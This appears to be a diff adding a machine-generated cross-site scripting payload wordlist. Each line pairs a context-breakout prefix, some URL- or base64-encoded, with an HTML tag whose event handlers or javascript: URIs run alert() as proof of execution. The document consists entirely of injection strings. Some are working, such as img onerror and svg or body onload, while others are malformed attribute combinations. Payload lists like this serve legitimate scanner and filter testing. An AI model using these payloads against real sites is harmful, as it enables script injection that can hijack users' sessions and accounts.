+.\>"</.<form Autoplay='javascript:alert(3)' Onkeyup='alert(3)' Action='alert(1)' Data-info='test'/>
+>"<<iframe Onchange='alert(1)' Src='alert(1)' On>alert(1)</iframe>
+%20">%20<<audio Popover Onfocus='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+"><svg Onblur='alert(1)' Onmouseover='alert(1)' On>alert(1)</svg>
+\"><video Autofocus Ontoggle='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+%20">%20<<iframe Onkeydown='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+>"<<body Href='javascript:alert(3)' Ontoggle='alert(3)' Onload='alert(1)' Data-test='test'/>
+./>%20<./<video Only Oninput='alert(2)' Onplay='alert(1)' Data-xss='test'></video>
+%20">%20<<iframe Onerror='alert(1)' Src='alert(1)' Autofocus>alert(1)</iframe>
+'>\"<iframe Onload='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+%3e%3c<svg Onblur='alert(1)' Onmouseover='alert(1)' On>alert(1)</svg>
+./>%20<./<form Only='javascript:alert(3)' Onblur='alert(3)' Action='alert(1)' Data-info='test'/>
+\"><video Autofocus Onload='alert(2)' Onplay='alert(1)' Data-info='test'></video>
+%20">%20<<svg Onload='alert(1)' Style='alert(1)' On>alert(1)</svg>
+%20/%20><script Onchange='alert(1)' Type='alert(1)' Autoplay>alert(1)</script>
+.\>"</.<script Oninput='alert(1)' Type='alert(1)' On>alert(1)</script>
+%20">%20<<audio Autofocus Onmouseover='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+>"<<iframe Onsubmit='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+>"<<audio Autoplay Onselect='alert(2)' Onplay='alert(1)' Data-custom='test'></audio>
+./>%20<./<form Autoplay='javascript:alert(3)' Onsubmit='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+'>\"<svg Onerror='alert(1)' Style='alert(1)' Autofocus>alert(1)</svg>
+><<body Popover='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+.\>"</.<body Autoplay='javascript:alert(3)' Onblur='alert(3)' Onload='alert(1)' Data-info='test'/>
+"><video Only Onselect='alert(2)' Autoplay='alert(1)' Data-info='test'></video>
+>"<<body Href='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-info='test'/>
+'>\"<img Href='javascript:alert(3)' Onerror='alert(3)' Src='alert(1)' Data-custom='test'/>
+>"<<iframe Onload='alert(1)' Src='alert(1)' Autofocus>alert(1)</iframe>
+"><form Autofocus='javascript:alert(3)' Oninput='alert(3)' Action='alert(1)' Data-xss='test'/>
+./>%20<./<iframe Ontoggle='alert(1)' Src='alert(1)' Popover>alert(1)</iframe>
+>"<<input Only='javascript:alert(3)' Onerror='alert(3)' Value='alert(1)' Data-xss='test'/>
+./>%20<./<img Autoplay='javascript:alert(3)' Onchange='alert(3)' Src='alert(1)' Data-xss='test'/>
+>"<<script Ontoggle='alert(1)' Type='alert(1)' Autofocus>alert(1)</script>
+\"><video Autoplay Onkeyup='alert(2)' Src='alert(1)' Data-custom='test'></video>
+Pjw=<form On='javascript:alert(3)' Ontoggle='alert(3)' Action='alert(1)' Data-info='test'/>
+./>%20<./<svg Onfocus='alert(1)' Onload='alert(1)' Only>alert(1)</svg>
+><<script Ontoggle='alert(1)' Type='alert(1)' Autofocus>alert(1)</script>
+/>%20<<body On='javascript:alert(3)' Onmouseover='alert(3)' Onload='alert(1)' Data-custom='test'/>
+<"<script Onmouseover='alert(1)' Type='alert(1)' Autofocus>alert(1)</script>
+>"<<body Autofocus='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-info='test'/>
+%3e%3c<video Autoplay Onload='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+'>\"<img Autoplay='javascript:alert(3)' Ontoggle='alert(3)' Src='alert(1)' Data-custom='test'/>
+><<svg Onerror='alert(1)' Onmouseover='alert(1)' Autoplay>alert(1)</svg>
+"><script Onpaste='alert(1)' Type='alert(1)' Autoplay>alert(1)</script>
+'>\"<iframe Onselect='alert(1)' Onload='alert(1)' Autoplay>alert(1)</iframe>
+%3e%3c<script Onclick='alert(1)' Src='alert(1)' Autofocus>alert(1)</script>
+>"<<body Only='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+%20">%20<<video Autoplay Onblur='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+><<audio Href Onpaste='alert(2)' Src='alert(1)' Data-test='test'></audio>
+"><audio On Onblur='alert(2)' Onplay='alert(1)' Data-info='test'></audio>
+.\>"</.<form Only='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+%20">%20<<svg Onchange='alert(1)' Style='alert(1)' Autofocus>alert(1)</svg>
+"><form Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Onsubmit='alert(1)' Data-xss='test'/>
+<"<script Onpaste='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+><<body On='javascript:alert(3)' Onsubmit='alert(3)' Onload='alert(1)' Data-xss='test'/>
+./>%20<./<iframe Onload='alert(1)' Src='alert(1)' Popover>alert(1)</iframe>
+%20">%20<<body Only='javascript:alert(3)' Onfocus='alert(3)' Onload='alert(1)' Data-xss='test'/>
+><<body Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Onload='alert(1)' Data-test='test'/>
+Pjw=<form Href='javascript:alert(3)' Onclick='alert(3)' Action='alert(1)' Data-xss='test'/>
+/>%20<<script Onkeydown='alert(1)' Src='alert(1)' Autofocus>alert(1)</script>
+Pjw=<body Href='javascript:alert(3)' Onload='alert(3)' Onload='alert(1)' Data-custom='test'/>
+\"><script Onkeyup='alert(1)' Type='alert(1)' Popover>alert(1)</script>
+%20/%20><img Only='javascript:alert(3)' Oninput='alert(3)' Alt='alert(1)' Data-info='test'/>
+/>%20<<body Href='javascript:alert(3)' Onblur='alert(3)' Onerror='alert(1)' Data-test='test'/>
+"><script Onclick='alert(1)' Src='alert(1)' Href>alert(1)</script>
+'>\"<input Autoplay='javascript:alert(3)' Onmouseover='alert(3)' Value='alert(1)' Data-test='test'/>
+"><script Ontoggle='alert(1)' Type='alert(1)' On>alert(1)</script>
+%3e%3c<form Autofocus='javascript:alert(3)' Oninput='alert(3)' Onsubmit='alert(1)' Data-xss='test'/>
+.\>"</.<input Only='javascript:alert(3)' Onselect='alert(3)' Value='alert(1)' Data-info='test'/>
+\"><iframe Oninput='alert(1)' Onload='alert(1)' Href>alert(1)</iframe>
+.\>"</.<iframe Onkeydown='alert(1)' Src='alert(1)' Autofocus>alert(1)</iframe>
+"><script Onpaste='alert(1)' Type='alert(1)' On>alert(1)</script>
+'>\"<form Autoplay='javascript:alert(3)' Onfocus='alert(3)' Action='alert(1)' Data-test='test'/>
+%20">%20<<video Autofocus Onmouseover='alert(2)' Onplay='alert(1)' Data-info='test'></video>
+%20/%20><iframe Onchange='alert(1)' Src='alert(1)' On>alert(1)</iframe>
+Pjw=<form Only='javascript:alert(3)' Onerror='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+%3e%3c<img Only='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-test='test'/>
+%20/%20><body On='javascript:alert(3)' Onchange='alert(3)' Onload='alert(1)' Data-info='test'/>
+>"<<img Popover='javascript:alert(3)' Onclick='alert(3)' Src='alert(1)' Data-custom='test'/>
+'>\"<audio Href Onchange='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+%3e%3c<script Onclick='alert(1)' Type='alert(1)' Href>alert(1)</script>
+%3e%3c<script Onload='alert(1)' Src='alert(1)' Only>alert(1)</script>
+./>%20<./<input Autoplay='javascript:alert(3)' Onblur='alert(3)' Onchange='alert(1)' Data-xss='test'/>
+%20">%20<<body Only='javascript:alert(3)' Onfocus='alert(3)' Onload='alert(1)' Data-test='test'/>
+><<input Popover='javascript:alert(3)' Onerror='alert(3)' Onfocus='alert(1)' Data-custom='test'/>
+><<input Only='javascript:alert(3)' Onsubmit='alert(3)' Onchange='alert(1)' Data-info='test'/>
+/>%20<<form Popover='javascript:alert(3)' Onselect='alert(3)' Action='alert(1)' Data-test='test'/>
+./>%20<./<iframe Onblur='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+%3e%3c<svg Onclick='alert(1)' Style='alert(1)' On>alert(1)</svg>
+<"<img Popover='javascript:alert(3)' Onmouseover='alert(3)' Src='alert(1)' Data-custom='test'/>
+'>\"<svg Onpaste='alert(1)' Onmouseover='alert(1)' On>alert(1)</svg>
+%20">%20<<script Onselect='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+><<script Onsubmit='alert(1)' Src='alert(1)' On>alert(1)</script>
+Pjw=<script Onclick='alert(1)' Type='alert(1)' Only>alert(1)</script>
+%3e%3c<input Autofocus='javascript:alert(3)' Onchange='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+Pjw=<body Href='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-custom='test'/>
+%20/%20><img Autoplay='javascript:alert(3)' Onfocus='alert(3)' Src='alert(1)' Data-custom='test'/>
+%20/%20><iframe Onpaste='alert(1)' Onload='alert(1)' Autofocus>alert(1)</iframe>
+"><audio Only Onchange='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+Pjw=<script Onkeydown='alert(1)' Type='alert(1)' Autofocus>alert(1)</script>
+><<form Popover='javascript:alert(3)' Onblur='alert(3)' Action='alert(1)' Data-xss='test'/>
+.\>"</.<iframe Onsubmit='alert(1)' Onload='alert(1)' Href>alert(1)</iframe>
+.\>"</.<body Popover='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-info='test'/>
+\"><iframe Onfocus='alert(1)' Onload='alert(1)' Popover>alert(1)</iframe>
+Pjw=<svg Onchange='alert(1)' Onmouseover='alert(1)' On>alert(1)</svg>
+"><svg Onsubmit='alert(1)' Onload='alert(1)' Autofocus>alert(1)</svg>
+%20">%20<<iframe Onchange='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+Pjw=<script Ontoggle='alert(1)' Type='alert(1)' Href>alert(1)</script>
+'>\"<body On='javascript:alert(3)' Onsubmit='alert(3)' Onload='alert(1)' Data-custom='test'/>
+/>%20<<script Onclick='alert(1)' Src='alert(1)' Only>alert(1)</script>
+%3e%3c<video Popover Onfocus='alert(2)' Autoplay='alert(1)' Data-info='test'></video>
+'>\"<video Popover Onchange='alert(2)' Autoplay='alert(1)' Data-custom='test'></video>
+%20">%20<<svg Onload='alert(1)' Style='alert(1)' Href>alert(1)</svg>
+'>\"<video Popover Oninput='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+%20/%20><img Autofocus='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-info='test'/>
+%20/%20><audio Href Onload='alert(2)' Src='alert(1)' Data-info='test'></audio>
+/>%20<<iframe Onfocus='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+Pjw=<video Popover Onclick='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+/>%20<<img Href='javascript:alert(3)' Onkeyup='alert(3)' Src='alert(1)' Data-custom='test'/>
+<"<iframe Onclick='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+><<body On='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-test='test'/>
+.\>"</.<script Onerror='alert(1)' Type='alert(1)' Only>alert(1)</script>
+'>\"<form Autoplay='javascript:alert(3)' Onerror='alert(3)' Action='alert(1)' Data-info='test'/>
+%20/%20><input Href='javascript:alert(3)' Onerror='alert(3)' Onchange='alert(1)' Data-test='test'/>
+"><body Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+.\>"</.<script Onerror='alert(1)' Type='alert(1)' Autoplay>alert(1)</script>
+"><script Onload='alert(1)' Type='alert(1)' Autoplay>alert(1)</script>
+><<img Autoplay='javascript:alert(3)' Oninput='alert(3)' Src='alert(1)' Data-info='test'/>
+%3e%3c<iframe Onmouseover='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+>"<<body Autofocus='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-test='test'/>
+'>\"<script Onload='alert(1)' Type='alert(1)' Autofocus>alert(1)</script>
+.\>"</.<iframe Onchange='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+\"><form Autofocus='javascript:alert(3)' Onselect='alert(3)' Onsubmit='alert(1)' Data-custom='test'/>
+%20/%20><body Popover='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+%20">%20<<video Autoplay Ontoggle='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+Pjw=<img Autoplay='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-test='test'/>
+.\>"</.<form Popover='javascript:alert(3)' Onkeydown='alert(3)' Onsubmit='alert(1)' Data-xss='test'/>
+><<video Href Onmouseover='alert(2)' Onplay='alert(1)' Data-info='test'></video>
+><<script Onkeydown='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+/>%20<<form Href='javascript:alert(3)' Onerror='alert(3)' Action='alert(1)' Data-test='test'/>
+./>%20<./<script Onsubmit='alert(1)' Type='alert(1)' Href>alert(1)</script>
+%20">%20<<input Autofocus='javascript:alert(3)' Onerror='alert(3)' Onfocus='alert(1)' Data-xss='test'/>
+/>%20<<video Popover Oninput='alert(2)' Src='alert(1)' Data-xss='test'></video>
+><<img Only='javascript:alert(3)' Onblur='alert(3)' Src='alert(1)' Data-xss='test'/>
+Pjw=<audio Only Onload='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+Pjw=<form On='javascript:alert(3)' Onpaste='alert(3)' Onsubmit='alert(1)' Data-custom='test'/>
+Pjw=<audio Href Onkeydown='alert(2)' Autoplay='alert(1)' Data-test='test'></audio>
+%20/%20><body Only='javascript:alert(3)' Onblur='alert(3)' Onload='alert(1)' Data-xss='test'/>
+%20">%20<<iframe Onload='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+"><video Autofocus Onerror='alert(2)' Autoplay='alert(1)' Data-info='test'></video>
+.\>"</.<input Popover='javascript:alert(3)' Onerror='alert(3)' Value='alert(1)' Data-xss='test'/>
+"><input Popover='javascript:alert(3)' Onkeydown='alert(3)' Onchange='alert(1)' Data-custom='test'/>
+\"><iframe Onclick='alert(1)' Onload='alert(1)' Autoplay>alert(1)</iframe>
+/>%20<<body Autoplay='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+'>\"<audio On Ontoggle='alert(2)' Src='alert(1)' Data-custom='test'></audio>
+%20">%20<<audio Only Onload='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+<"<svg Onload='alert(1)' Style='alert(1)' Autoplay>alert(1)</svg>
+'>\"<script Onmouseover='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+\"><script Onchange='alert(1)' Src='alert(1)' On>alert(1)</script>
+%20/%20><audio Autoplay Ontoggle='alert(2)' Src='alert(1)' Data-info='test'></audio>
+'>\"<input Only='javascript:alert(3)' Onmouseover='alert(3)' Value='alert(1)' Data-info='test'/>
+%3e%3c<script Onsubmit='alert(1)' Type='alert(1)' Href>alert(1)</script>
+\"><form Autoplay='javascript:alert(3)' Onpaste='alert(3)' Action='alert(1)' Data-test='test'/>
+\"><audio Autoplay Onselect='alert(2)' Onplay='alert(1)' Data-xss='test'></audio>
+><<form Autofocus='javascript:alert(3)' Onclick='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+><<script Onclick='alert(1)' Src='alert(1)' On>alert(1)</script>
+\"><input Popover='javascript:alert(3)' Onselect='alert(3)' Onchange='alert(1)' Data-test='test'/>
+"><audio Href Onload='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+%20/%20><body Autofocus='javascript:alert(3)' Oninput='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+\"><body Autoplay='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-test='test'/>
+><<video Popover Onselect='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+.\>"</.<body Autoplay='javascript:alert(3)' Onload='alert(3)' Onload='alert(1)' Data-test='test'/>
+%20">%20<<script Ontoggle='alert(1)' Src='alert(1)' Href>alert(1)</script>
+./>%20<./<img On='javascript:alert(3)' Oninput='alert(3)' Alt='alert(1)' Data-info='test'/>
+\"><video Autofocus Onpaste='alert(2)' Autoplay='alert(1)' Data-info='test'></video>
+%3e%3c<input On='javascript:alert(3)' Onclick='alert(3)' Onchange='alert(1)' Data-test='test'/>
+%3e%3c<form Href='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+>"<<script Onkeydown='alert(1)' Type='alert(1)' Autoplay>alert(1)</script>
+>"<<audio Only Onkeydown='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+%20/%20><form Autoplay='javascript:alert(3)' Onerror='alert(3)' Action='alert(1)' Data-custom='test'/>
+\"><svg Onselect='alert(1)' Onmouseover='alert(1)' Popover>alert(1)</svg>
+/>%20<<script Onblur='alert(1)' Src='alert(1)' Only>alert(1)</script>
+.\>"</.<iframe Onsubmit='alert(1)' Onload='alert(1)' Autofocus>alert(1)</iframe>
+><<video Only Onkeyup='alert(2)' Src='alert(1)' Data-info='test'></video>
+\"><script Onsubmit='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+"><audio Autoplay Onchange='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+%3e%3c<img On='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-test='test'/>
+<"<audio Only Onkeyup='alert(2)' Onplay='alert(1)' Data-info='test'></audio>
+%20/%20><body Autoplay='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+%3e%3c<svg Onchange='alert(1)' Style='alert(1)' Autofocus>alert(1)</svg>
+"><video On Onmouseover='alert(2)' Src='alert(1)' Data-info='test'></video>
+Pjw=<svg Oninput='alert(1)' Onload='alert(1)' Popover>alert(1)</svg>
+><<form Popover='javascript:alert(3)' Onfocus='alert(3)' Action='alert(1)' Data-custom='test'/>
+Pjw=<svg Onchange='alert(1)' Onload='alert(1)' On>alert(1)</svg>
+.\>"</.<input Autoplay='javascript:alert(3)' Onkeyup='alert(3)' Onchange='alert(1)' Data-test='test'/>
+>"<<body Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Onload='alert(1)' Data-xss='test'/>
+\"><form On='javascript:alert(3)' Onmouseover='alert(3)' Action='alert(1)' Data-test='test'/>
+\"><script Onkeyup='alert(1)' Type='alert(1)' Popover>alert(1)</script>
+'>\"<script Onpaste='alert(1)' Src='alert(1)' Only>alert(1)</script>
+./>%20<./<svg Onerror='alert(1)' Style='alert(1)' On>alert(1)</svg>
+\"><img Autofocus='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-info='test'/>
+'>\"<audio Autoplay Oninput='alert(2)' Onplay='alert(1)' Data-custom='test'></audio>
+./>%20<./<audio Popover Onkeyup='alert(2)' Onplay='alert(1)' Data-info='test'></audio>
+%3e%3c<img Href='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-test='test'/>
+<"<iframe Onkeyup='alert(1)' Onload='alert(1)' Autoplay>alert(1)</iframe>
+Pjw=<input Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Onchange='alert(1)' Data-test='test'/>
+'>\"<svg Onselect='alert(1)' Style='alert(1)' On>alert(1)</svg>
+./>%20<./<svg Onclick='alert(1)' Onload='alert(1)' Popover>alert(1)</svg>
+/>%20<<iframe Onload='alert(1)' Src='alert(1)' On>alert(1)</iframe>
+'>\"<script Onload='alert(1)' Type='alert(1)' Href>alert(1)</script>
+<"<iframe Onkeydown='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+.\>"</.<audio Autofocus Onblur='alert(2)' Src='alert(1)' Data-info='test'></audio>
+/>%20<<img Autoplay='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-test='test'/>
+%3e%3c<form Only='javascript:alert(3)' Onchange='alert(3)' Action='alert(1)' Data-info='test'/>
+%3e%3c<iframe Onload='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+./>%20<./<form Only='javascript:alert(3)' Onchange='alert(3)' Onsubmit='alert(1)' Data-xss='test'/>
+'>\"<iframe Onkeyup='alert(1)' Src='alert(1)' On>alert(1)</iframe>
+%20">%20<<form On='javascript:alert(3)' Onchange='alert(3)' Action='alert(1)' Data-test='test'/>
+Pjw=<script Oninput='alert(1)' Type='alert(1)' Only>alert(1)</script>
+Pjw=<svg Oninput='alert(1)' Onmouseover='alert(1)' Popover>alert(1)</svg>
+<"<body On='javascript:alert(3)' Onfocus='alert(3)' Onload='alert(1)' Data-info='test'/>
+"><form Autoplay='javascript:alert(3)' Onload='alert(3)' Action='alert(1)' Data-custom='test'/>
+.\>"</.<iframe Onerror='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+./>%20<./<form On='javascript:alert(3)' Onchange='alert(3)' Onsubmit='alert(1)' Data-custom='test'/>
+.\>"</.<body Href='javascript:alert(3)' Ontoggle='alert(3)' Onload='alert(1)' Data-custom='test'/>
+"><iframe Onload='alert(1)' Onload='alert(1)' Only>alert(1)</iframe>
+<"<svg Onpaste='alert(1)' Style='alert(1)' Href>alert(1)</svg>
+/>%20<<img Popover='javascript:alert(3)' Onblur='alert(3)' Src='alert(1)' Data-info='test'/>
+Pjw=<input Autoplay='javascript:alert(3)' Onkeydown='alert(3)' Onfocus='alert(1)' Data-custom='test'/>
+.\>"</.<iframe Oninput='alert(1)' Onload='alert(1)' Autofocus>alert(1)</iframe>
+./>%20<./<script Onchange='alert(1)' Type='alert(1)' Only>alert(1)</script>
+'>\"<form Autoplay='javascript:alert(3)' Ontoggle='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+.\>"</.<svg Onmouseover='alert(1)' Style='alert(1)' On>alert(1)</svg>
+\"><audio On Onselect='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+%20">%20<<video Popover Onload='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+\"><input Popover='javascript:alert(3)' Onfocus='alert(3)' Onchange='alert(1)' Data-test='test'/>
+%20">%20<<script Onselect='alert(1)' Src='alert(1)' Only>alert(1)</script>
+.\>"</.<script Onkeydown='alert(1)' Type='alert(1)' On>alert(1)</script>
+><<svg Onerror='alert(1)' Style='alert(1)' Href>alert(1)</svg>
+>"<<input Only='javascript:alert(3)' Onclick='alert(3)' Value='alert(1)' Data-custom='test'/>
+>"<<script Onfocus='alert(1)' Type='alert(1)' On>alert(1)</script>
+"><audio Only Onpaste='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+Pjw=<img On='javascript:alert(3)' Onfocus='alert(3)' Alt='alert(1)' Data-test='test'/>
+"><script Onload='alert(1)' Type='alert(1)' On>alert(1)</script>
+><<img On='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+/>%20<<iframe Onkeyup='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+'>\"<input Autofocus='javascript:alert(3)' Onchange='alert(3)' Value='alert(1)' Data-info='test'/>
+\"><body Autoplay='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-info='test'/>
+%20/%20><script Onerror='alert(1)' Type='alert(1)' Href>alert(1)</script>
+'>\"<script Onerror='alert(1)' Type='alert(1)' Href>alert(1)</script>
+/>%20<<img Autoplay='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+.\>"</.<iframe Onmouseover='alert(1)' Src='alert(1)' Popover>alert(1)</iframe>
+>"<<img Only='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+./>%20<./<svg Ontoggle='alert(1)' Onmouseover='alert(1)' Autoplay>alert(1)</svg>
+\"><body On='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-test='test'/>
+><<input Popover='javascript:alert(3)' Onselect='alert(3)' Value='alert(1)' Data-custom='test'/>
+'>\"<svg Onselect='alert(1)' Onmouseover='alert(1)' Only>alert(1)</svg>
+%20/%20><iframe Ontoggle='alert(1)' Src='alert(1)' On>alert(1)</iframe>
+/>%20<<script Ontoggle='alert(1)' Type='alert(1)' Autoplay>alert(1)</script>
+%20">%20<<img Autofocus='javascript:alert(3)' Oninput='alert(3)' Alt='alert(1)' Data-xss='test'/>
+%3e%3c<video Popover Onselect='alert(2)' Autoplay='alert(1)' Data-info='test'></video>
+.\>"</.<input Only='javascript:alert(3)' Onkeyup='alert(3)' Onchange='alert(1)' Data-test='test'/>
+./>%20<./<audio On Onblur='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+><<video Href Onselect='alert(2)' Autoplay='alert(1)' Data-xss='test'></video>
+\"><body Autoplay='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+%20/%20><body Href='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+/>%20<<body Autofocus='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-info='test'/>
+\"><input On='javascript:alert(3)' Onkeydown='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+<"<script Ontoggle='alert(1)' Src='alert(1)' On>alert(1)</script>
+.\>"</.<script Onkeyup='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+>"<<input Autoplay='javascript:alert(3)' Ontoggle='alert(3)' Onchange='alert(1)' Data-xss='test'/>
+%20/%20><audio Href Onsubmit='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+<"<video On Onkeyup='alert(2)' Autoplay='alert(1)' Data-info='test'></video>
+Pjw=<svg Onblur='alert(1)' Onmouseover='alert(1)' Href>alert(1)</svg>
+./>%20<./<img Autofocus='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-info='test'/>
+%20/%20><video Autofocus Onkeydown='alert(2)' Src='alert(1)' Data-info='test'></video>
+>"<<script Onmouseover='alert(1)' Type='alert(1)' Only>alert(1)</script>
+%20">%20<<body Only='javascript:alert(3)' Onclick='alert(3)' Onload='alert(1)' Data-test='test'/>
+"><form Only='javascript:alert(3)' Oninput='alert(3)' Action='alert(1)' Data-custom='test'/>
+Pjw=<body Popover='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+><<video Popover Onload='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+Pjw=<iframe Onfocus='alert(1)' Onload='alert(1)' Popover>alert(1)</iframe>
+%20">%20<<script Onkeydown='alert(1)' Type='alert(1)' Only>alert(1)</script>
+<"<img On='javascript:alert(3)' Onmouseover='alert(3)' Alt='alert(1)' Data-xss='test'/>
+%3e%3c<body On='javascript:alert(3)' Onchange='alert(3)' Onload='alert(1)' Data-xss='test'/>
+/>%20<<form Href='javascript:alert(3)' Onblur='alert(3)' Action='alert(1)' Data-custom='test'/>
+<"<img Href='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-test='test'/>
+%3e%3c<script Onchange='alert(1)' Src='alert(1)' Only>alert(1)</script>
+<"<form Autoplay='javascript:alert(3)' Ontoggle='alert(3)' Action='alert(1)' Data-test='test'/>
+><<body Only='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+/>%20<<body Autofocus='javascript:alert(3)' Oninput='alert(3)' Onerror='alert(1)' Data-test='test'/>
+%20">%20<<svg Onkeydown='alert(1)' Style='alert(1)' Autoplay>alert(1)</svg>
+'>\"<audio Popover Onselect='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+%20/%20><form Popover='javascript:alert(3)' Ontoggle='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+Pjw=<body Only='javascript:alert(3)' Ontoggle='alert(3)' Onload='alert(1)' Data-custom='test'/>
+<"<audio Autofocus Onblur='alert(2)' Onplay='alert(1)' Data-xss='test'></audio>
+\"><form Autofocus='javascript:alert(3)' Onselect='alert(3)' Onsubmit='alert(1)' Data-xss='test'/>
+'>\"<svg Onmouseover='alert(1)' Onmouseover='alert(1)' On>alert(1)</svg>
+/>%20<<input Autofocus='javascript:alert(3)' Ontoggle='alert(3)' Value='alert(1)' Data-xss='test'/>
+%20">%20<<form Autofocus='javascript:alert(3)' Ontoggle='alert(3)' Action='alert(1)' Data-custom='test'/>
+.\>"</.<iframe Onerror='alert(1)' Src='alert(1)' Popover>alert(1)</iframe>
+%3e%3c<video Autoplay Onkeydown='alert(2)' Src='alert(1)' Data-test='test'></video>
+%20">%20<<input Href='javascript:alert(3)' Onsubmit='alert(3)' Onfocus='alert(1)' Data-test='test'/>
+.\>"</.<iframe Onmouseover='alert(1)' Src='alert(1)' Popover>alert(1)</iframe>
+\"><form Popover='javascript:alert(3)' Ontoggle='alert(3)' Action='alert(1)' Data-custom='test'/>
+>"<<script Onload='alert(1)' Type='alert(1)' Popover>alert(1)</script>
+'>\"<form Autofocus='javascript:alert(3)' Onselect='alert(3)' Action='alert(1)' Data-test='test'/>
+<"<audio Popover Onpaste='alert(2)' Src='alert(1)' Data-test='test'></audio>
+%3e%3c<input On='javascript:alert(3)' Onclick='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+\"><form On='javascript:alert(3)' Onpaste='alert(3)' Action='alert(1)' Data-custom='test'/>
+.\>"</.<input Href='javascript:alert(3)' Onselect='alert(3)' Value='alert(1)' Data-info='test'/>
+'>\"<iframe Onselect='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+<"<video Autofocus Oninput='alert(2)' Src='alert(1)' Data-info='test'></video>
